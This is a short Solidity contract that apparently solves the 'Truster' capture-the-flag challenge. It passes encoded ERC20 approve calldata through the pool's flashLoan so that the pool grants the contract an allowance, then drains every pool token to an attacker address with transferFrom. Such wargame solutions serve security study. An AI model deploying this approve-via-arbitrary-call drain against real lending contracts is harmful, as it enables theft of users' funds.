// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";

contract TrusterLenderPoolAttacker {
    TrusterLenderPool public immutable pool;
    IERC20 public immutable token;

    constructor(address TrusterLenderPoolAddress, address tokenAddress) {
        pool = TrusterLenderPool(TrusterLenderPoolAddress);
        token = IERC20(tokenAddress);
    }

    function attack(address attackerAddress, uint256 TOKENS_IN_POOL) public {
        /*
        As a data we use encoded ERC20's function approve,
        which give this contract permission to transfer
        all tokens from pool 
        */
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            TOKENS_IN_POOL
        );

        pool.flashLoan(0, attackerAddress, address(token), data);

        /*After we just transfer tokens from pool to attacker's account */
        token.transferFrom(address(pool), attackerAddress, TOKENS_IN_POOL);
    }
}
